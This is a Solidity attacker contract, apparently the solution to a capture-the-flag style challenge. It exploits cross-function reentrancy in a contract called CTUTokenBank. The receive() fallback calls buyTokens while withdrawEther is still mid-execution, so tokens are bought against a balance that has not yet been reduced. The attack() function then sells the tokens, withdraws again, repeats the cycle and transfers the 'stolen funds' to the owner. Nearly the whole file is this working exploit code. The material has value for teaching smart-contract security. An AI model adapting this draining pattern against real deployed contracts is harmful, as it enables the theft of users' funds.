// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

// CTUTokenBank Interface
interface ICTUTokenBank {
    function depositEther() external payable;
    function withdrawEther() external;
    function buyTokens() external;
    function sellTokens(uint _amount) external; 
    function balances(address) external view returns (uint);
}

// OpenZeppelin's ERC20 interface
interface ICTUToken {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

/**
 * @title CTUTokenBankAttacker
 * @notice Demonstrates a cross-function reentrancy exploit on CTUTokenBank.
 *         Even though 'withdrawEther' is guarded by a reentrancy lock, 'buyTokens'
 *         is wide open. The attacker calls 'withdrawEther', and during the
 *         fallback—while the lock is active—calls 'buyTokens' using the *old*
 *         balance that hasn't yet been subtracted.
 */
contract CTUTokenBankAttacker {
    ICTUTokenBank public ctuBank;
    ICTUToken public ctuToken;
    address public owner;
    bool private alreadyCalled;

    constructor(address _ctuBank, address _ctuToken) {
        ctuBank = ICTUTokenBank(_ctuBank);
        ctuToken = ICTUToken(_ctuToken);
        owner = msg.sender;
        alreadyCalled = false;
    }

    /**
     * @dev Entry point for the exploit:
     *      - Deposit some Ether to build up 'balances[attacker]' inside CTUTokenBank.
     *      - Immediately call withdrawEther(...) to trigger the cross-function reentrant call.
     */
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        
        // 1) Deposit Ether into the bank
        ctuBank.depositEther{value: msg.value}();

        // 2) Start a withdrawal, which will send Ether back to this contract
        ctuBank.withdrawEther();

        // 3) Sell the CTU Tokens to the bank
        ctuToken.approve(address(ctuBank), ctuToken.balanceOf(address(this)));
        ctuBank.sellTokens(ctuToken.balanceOf(address(this)));

        // 4) Withdraw the Ether again
        ctuBank.withdrawEther();

        // 5) Repeat the attack one more time
        alreadyCalled = false;
        ctuBank.depositEther{value: 5 ether}();
        ctuBank.withdrawEther();
        ctuToken.approve(address(ctuBank), 5 * 10 ** 18);
        ctuBank.sellTokens(ctuToken.balanceOf(address(this)));
        ctuBank.withdrawEther();

        // 6) Transfer the stolen funds to the player
        payable(owner).transfer(address(this).balance);
    }

    /**
     * @dev The fallback is triggered when the bank sends Ether back.
     *      While locked in withdrawEther, we cannot call withdrawEther/sellTokens again,
     *      but we *can* call buyTokens. We do that once, to illustrate the exploit.
     */
    receive () external payable {
        if (!alreadyCalled) {
            alreadyCalled = true;

            // The bank hasn't subtracted the withdrawn amount from our bank balance yet.
            ctuBank.buyTokens();
        }
    }

}